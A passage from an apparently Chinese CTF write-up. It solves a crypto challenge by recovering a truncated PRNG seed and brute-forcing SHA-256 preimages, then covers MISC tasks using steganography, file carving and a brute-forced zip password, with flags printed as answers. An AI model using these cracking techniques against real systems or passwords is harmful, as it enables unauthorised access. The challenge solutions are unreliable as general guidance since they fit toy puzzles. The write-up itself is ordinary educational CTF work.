class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag) // <span class="hljs-number">4</span>):<br>            self.proof.append(flag[<span class="hljs-number">4</span> * i:<span class="hljs-number">4</span> + <span class="hljs-number">4</span> * i])<br>            self.sha = sha256(self.proof[i]).hexdigest().encode()<br>            self.sha_flag.append(bytes_to_long(self.sha))<br>        <span class="hljs-keyword">return</span> self.sha_flag<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RHODES_ELITE</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.Doctor = getPrime(<span class="hljs-number">64</span>)<br>        self.Amiya = getRandomNBitInteger(<span class="hljs-number">40</span>)<br>        self.Rosmontis = getRandomNBitInteger(<span class="hljs-number">40</span>)<br>        self.Blaze = getRandomNBitInteger(<span class="hljs-number">40</span>)<br>        self.seed = seed<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor<br>        <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">12</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Amiya = &quot;</span>, self.Amiya)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Rosmontis = &quot;</span>, self.Rosmontis)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Blaze = &quot;</span>, self.Blaze)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Doctor = &quot;</span>, self.Doctor)<br><br><br>sha = SHA256()<br>sha_flag = sha.encryption()<br>elite = RHODES_ELITE()<br>elite.output()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Ash = &quot;</span>, elite.<span class="hljs-built_in">next</span>())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;SliverAsh = &quot;</span>, elite.<span class="hljs-built_in">next</span>())<br>W = <span class="hljs-string">b&#x27;&#x27;</span>.join([long_to_bytes(sha_flag[i] % (seed ** <span class="hljs-number">3</span>) ^ (elite.<span class="hljs-built_in">next</span>() % <span class="hljs-number">100</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(sha_flag))])<br><span class="hljs-built_in">print</span>(bytes_to_long(W))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Amiya =  956366446278</span><br><span class="hljs-string">Rosmontis =  1061992537343</span><br><span class="hljs-string">Blaze =  636205571590</span><br><span class="hljs-string">Doctor =  18068433704538283397</span><br><span class="hljs-string">Ash =  1097363493609113</span><br><span class="hljs-string">SliverAsh =  2051431344160327</span><br><span class="hljs-string">1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><p>这题代码和ezStream挺像的。主体都是一个流加密。</p><p>我们可以得到第二轮加密时的seed</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RHODES_ELITE</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.Doctor = <span class="hljs-number">18068433704538283397</span> <span class="hljs-comment"># getPrime(64)</span><br>        self.Amiya = <span class="hljs-number">956366446278</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.Rosmontis = <span class="hljs-number">1061992537343</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.Blaze = <span class="hljs-number">636205571590</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.seed = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 956366446278x^2 + 1061992537343x + 636205571590 = 4494800869822930172 mod 18068433704538283397</span><br>        self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor<br>        <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">12</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Amiya = &quot;</span>, self.Amiya)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Rosmontis = &quot;</span>, self.Rosmontis)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Blaze = &quot;</span>, self.Blaze)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Doctor = &quot;</span>, self.Doctor)<br><br><br>r = RHODES_ELITE()<br>likeSeed = []<br><span class="hljs-keyword">for</span> seed <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">13</span>):<br>    r.seed =  (<span class="hljs-number">1097363493609113</span> &lt;&lt; <span class="hljs-number">12</span>) + seed<br>    <span class="hljs-keyword">if</span> r.<span class="hljs-built_in">next</span>() == <span class="hljs-number">2051431344160327</span>:<br>        <span class="hljs-comment"># seed = (1097363493609113 &lt;&lt; 12) + seed</span><br>        likeSeed.append((<span class="hljs-number">1097363493609113</span> &lt;&lt; <span class="hljs-number">12</span>) + seed)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(likeSeed)<br><span class="hljs-comment"># [4494800869822930172]</span><br></code></pre></td></tr></table></figure><p>可以看到只有一个解。接下来我们还要求解初始的seed才能进行解密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>    self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor<br>    <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><p>这个实际上是一个整环上的运算。是在Zmod(18068433704538283397)上的一个多项式。</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>956366446278</mn><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1061992537343</mn><mi>x</mi><mo>+</mo><mn>636205571590</mn><mo>=</mo><mn>4494800869822930172</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>18068433704538283397</mn></mrow><annotation encoding="application/x-tex">956366446278x^2 + 1061992537343x + 636205571590 = 4494800869822930172 \, mod \, 18068433704538283397</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord">9</span><span class="mord">5</span><span class="mord">6</span><span class="mord">3</span><span class="mord">6</span><span class="mord">6</span><span class="mord">4</span><span class="mord">4</span><span class="mord">6</span><span class="mord">2</span><span class="mord">7</span><span class="mord">8</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">6</span><span class="mord">1</span><span class="mord">9</span><span class="mord">9</span><span class="mord">2</span><span class="mord">5</span><span class="mord">3</span><span class="mord">7</span><span class="mord">3</span><span class="mord">4</span><span class="mord">3</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span><span class="mord">3</span><span class="mord">6</span><span class="mord">2</span><span class="mord">0</span><span class="mord">5</span><span class="mord">5</span><span class="mord">7</span><span class="mord">1</span><span class="mord">5</span><span class="mord">9</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">4</span><span class="mord">9</span><span class="mord">4</span><span class="mord">8</span><span class="mord">0</span><span class="mord">0</span><span class="mord">8</span><span class="mord">6</span><span class="mord">9</span><span class="mord">8</span><span class="mord">2</span><span class="mord">2</span><span class="mord">9</span><span class="mord">3</span><span class="mord">0</span><span class="mord">1</span><span class="mord">7</span><span class="mord">2</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">8</span><span class="mord">0</span><span class="mord">6</span><span class="mord">8</span><span class="mord">4</span><span class="mord">3</span><span class="mord">3</span><span class="mord">7</span><span class="mord">0</span><span class="mord">4</span><span class="mord">5</span><span class="mord">3</span><span class="mord">8</span><span class="mord">2</span><span class="mord">8</span><span class="mord">3</span><span class="mord">3</span><span class="mord">9</span><span class="mord">7</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mn>956366446278</mn><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1061992537343</mn><mi>x</mi><mo>+</mo><mn>636205571590</mn><mo>−</mo><mn>4494800869822930172</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>18068433704538283397</mn></mrow><annotation encoding="application/x-tex">f(x)=956366446278x^2 + 1061992537343x + 636205571590 - 4494800869822930172  \, mod \, 18068433704538283397</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord">9</span><span class="mord">5</span><span class="mord">6</span><span class="mord">3</span><span class="mord">6</span><span class="mord">6</span><span class="mord">4</span><span class="mord">4</span><span class="mord">6</span><span class="mord">2</span><span class="mord">7</span><span class="mord">8</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">6</span><span class="mord">1</span><span class="mord">9</span><span class="mord">9</span><span class="mord">2</span><span class="mord">5</span><span class="mord">3</span><span class="mord">7</span><span class="mord">3</span><span class="mord">4</span><span class="mord">3</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">6</span><span class="mord">3</span><span class="mord">6</span><span class="mord">2</span><span class="mord">0</span><span class="mord">5</span><span class="mord">5</span><span class="mord">7</span><span class="mord">1</span><span class="mord">5</span><span class="mord">9</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">4</span><span class="mord">9</span><span class="mord">4</span><span class="mord">8</span><span class="mord">0</span><span class="mord">0</span><span class="mord">8</span><span class="mord">6</span><span class="mord">9</span><span class="mord">8</span><span class="mord">2</span><span class="mord">2</span><span class="mord">9</span><span class="mord">3</span><span class="mord">0</span><span class="mord">1</span><span class="mord">7</span><span class="mord">2</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">8</span><span class="mord">0</span><span class="mord">6</span><span class="mord">8</span><span class="mord">4</span><span class="mord">3</span><span class="mord">3</span><span class="mord">7</span><span class="mord">0</span><span class="mord">4</span><span class="mord">5</span><span class="mord">3</span><span class="mord">8</span><span class="mord">2</span><span class="mord">8</span><span class="mord">3</span><span class="mord">3</span><span class="mord">9</span><span class="mord">7</span></span></span></span></span></p><p>我们求解这个多项式即可得到对应的seed值。这里使用的SageMath来计算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">R.&lt;x&gt; = Zmod(<span class="hljs-number">18068433704538283397</span>)[]<br>f = <span class="hljs-number">956366446278</span>*x^<span class="hljs-number">2</span> + <span class="hljs-number">1061992537343</span>*x + <span class="hljs-number">636205571590</span> - <span class="hljs-number">4494800869822930172</span><br>f.roots()<br><span class="hljs-comment"># [(12358488364449364025, 1), (626844643882, 1)]</span><br></code></pre></td></tr></table></figure><p>可以看到这里有两个值，12358488364449364025和626844643882。</p><p>这里seed要是40位的数才行。12358488364449364025是64位的，而626844643882是40位的。所以我们的seed是626844643882。</p><p>前面这部分只是这题的一部分难点。得到了seed后面怎么进行处理考虑了半天。这又是sha的又是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>e</mi><msup><mi>d</mi><mn>3</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">mod (seed^3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 没有办法逆过程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">table = string.ascii_letters + string.digits<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()[<span class="hljs-number">8</span>:-<span class="hljs-number">1</span>]<br>seed = getRandomNBitInteger(<span class="hljs-number">40</span>)<br></code></pre></td></tr></table></figure><p>当时看到有个table在这但是没有用到我还感到奇怪。现在看来，是叫我们暴力破解了。</p><p>字符集应该就是这个。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RHODES_ELITE</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.Doctor = <span class="hljs-number">18068433704538283397</span> <span class="hljs-comment"># getPrime(64)</span><br>        self.Amiya = <span class="hljs-number">956366446278</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.Rosmontis = <span class="hljs-number">1061992537343</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.Blaze = <span class="hljs-number">636205571590</span> <span class="hljs-comment"># getRandomNBitInteger(40)</span><br>        self.seed = <span class="hljs-number">626844643882</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>):<br>        self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor<br>        <span class="hljs-keyword">return</span> self.seed &gt;&gt; <span class="hljs-number">12</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">output</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Amiya = &quot;</span>, self.Amiya)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Rosmontis = &quot;</span>, self.Rosmontis)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Blaze = &quot;</span>, self.Blaze)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Doctor = &quot;</span>, self.Doctor)<br><br>seed = <span class="hljs-number">626844643882</span><br>r = RHODES_ELITE()<br>r.<span class="hljs-built_in">next</span>()<br>r.<span class="hljs-built_in">next</span>()<br>flag = <span class="hljs-number">1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084</span><br>flag = long_to_bytes(flag)<br><br><span class="hljs-comment"># 先用小写字母跑一下试试</span><br>table = string.ascii_lowercase + string.digits<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">15</span>):<br>    data = flag[i*<span class="hljs-number">15</span>: i*<span class="hljs-number">15</span> + <span class="hljs-number">15</span>]<br>    rnext = r.<span class="hljs-built_in">next</span>()<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> itertools.permutations(table,<span class="hljs-number">4</span>):<br>        mysha = bytes_to_long(sha256(<span class="hljs-string">&#x27;&#x27;</span>.join(x).encode(<span class="hljs-string">&quot;utf8&quot;</span>)).hexdigest().encode())<br>        mybyte = long_to_bytes(mysha % (seed ** <span class="hljs-number">3</span>) ^ (rnext % <span class="hljs-number">100</span>))<br>        <span class="hljs-keyword">if</span> mybyte == data:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(x), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>奇怪的是，我好多都跑不出来？9组数据我就跑出来三组。一开始以为是用的枚举导致的。后面换成笛卡尔集也没跑出来。后面怀疑是不是字符集少了东西。因为看其他的flag中间一般都会有几个’-‘或者’_’，所以我把’-_'都添加到了字符集，然后再跑。发现能够跑出来了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">table = string.ascii_lowercase + string.digits + <span class="hljs-string">&#x27;-_&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">15</span>):<br>    data = flag[i*<span class="hljs-number">15</span>: i*<span class="hljs-number">15</span> + <span class="hljs-number">15</span>]<br>    rnext = r.<span class="hljs-built_in">next</span>()<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> itertools.product(table,table,table,table):<br>        mysha = bytes_to_long(sha256(<span class="hljs-string">&#x27;&#x27;</span>.join(x).encode(<span class="hljs-string">&quot;utf8&quot;</span>)).hexdigest().encode())<br>        mybyte = long_to_bytes(mysha % (seed ** <span class="hljs-number">3</span>) ^ (rnext % <span class="hljs-number">100</span>))<br>        <span class="hljs-keyword">if</span> mybyte == data:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(x), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment"># d2a4d1af-8a80-8794-99ac-635f89494cac</span><br><span class="hljs-comment"># Dest0g3&#123;d2a4d1af-8a80-8794-99ac-635f89494cac&#125;</span><br></code></pre></td></tr></table></figure><p>花的时间也不算太长，大概5分钟。</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h1><h2 id="pngenius"><a class="markdownIt-Anchor" href="#pngenius"></a> Pngenius</h2><p>StegoSolve看一遍，图像上没有什么值得注意的地方。LSB可以看到一个密码。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0617373776f7264</span> <span class="hljs-number">20666</span>f72207a6970  Password  for zip<br><span class="hljs-attribute">3a5765616b5f5061</span> <span class="hljs-number">733577307264</span>ffff  :Weak_Pa s5w0rd..<br></code></pre></td></tr></table></figure><p>foremost分离出一个压缩包,用上述密码进行解压得到flag。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"># Dest0g3&#123;<span class="hljs-number">2908</span>C1AA-B2C1-B<span class="hljs-number">8E6-89D1</span>-<span class="hljs-number">21</span>B<span class="hljs-number">97D778603</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="easyencode"><a class="markdownIt-Anchor" href="#easyencode"></a> EasyEncode</h2><p>下载得到一个压缩包，没有其他信息了。密码找了一圈没有找到。采取爆破尝试。ziperello爆破6位数字密码得到密码为：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">100861<br></code></pre></td></tr></table></figure><p>打开文本文件得到摩斯电码:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-string">..---</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> -<span class="hljs-string">....</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> <span class="hljs-string">..---</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> -<span class="hljs-string">....</span> <span class="hljs-string">....-</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span 